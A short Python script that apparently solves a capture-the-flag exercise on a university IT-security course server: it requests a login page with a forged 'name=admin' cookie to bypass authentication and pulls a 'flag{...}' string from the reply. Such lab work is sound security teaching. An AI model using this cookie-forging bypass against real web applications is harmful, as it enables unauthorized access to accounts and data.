import requests
import re

def extract_flag_from_string(string):
    match = re.search(r'flag\{[^}]+}', string)
    if match:
        return match.group(0)

    return None

with requests.Session() as sess:
    target_url = "https://t01-21eed77f998bf827.itsec.sec.in.tum.de/login"
    cookies = {"name": "admin"}
    response = sess.get(target_url, cookies=cookies)
    flag = extract_flag_from_string(response.text)
    print(flag)